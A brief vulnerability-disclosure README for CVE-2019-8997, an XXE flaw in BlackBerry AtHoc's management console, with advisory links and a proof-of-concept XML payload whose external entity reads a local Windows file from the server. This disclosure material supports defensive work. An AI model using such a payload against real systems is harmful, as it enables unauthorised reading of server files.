# CVE-2019-8997
An XML External Entity Injection (XXE) vulnerability in the Management System (console) of BlackBerry AtHoc versions earlier than 7.6 HF-567 could allow an attacker to potentially read arbitrary local files from the application server or make requests on the network by entering maliciously crafted XML in an existing field.

## Reported By
Nolan B. Kennedy (nxkennedy)

## Security Advisory
http://support.blackberry.com/kb/articleDetail?articleNumber=000047227
<br>
https://nvd.nist.gov/vuln/detail/CVE-2019-8997

## Blog Post
https://www.nolanbkennedy.com/feed/xxe-vulnerability-blackberry-athoc
<br>
https://www.mindpointgroup.com/blog/pen-test/xxe-vulnerability-in-blackberry-athoc-networked-crisis-communication-platform/

## Proof of Concept Exploit
```xml
<!DOCTYPE doc [
<!ELEMENT doc ANY > 
<!ENTITY foo SYSTEM "file:///c:/windows/win.ini">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
version="1.0">
<xsl:output method="html" />
<xsl:template match="/">

<doc>&foo;</doc>

<head></head>
<body style="margin: 0; padding: 0;" oncontextmenu="return
false;"></body>
</xsl:template>
</xsl:stylesheet>
```

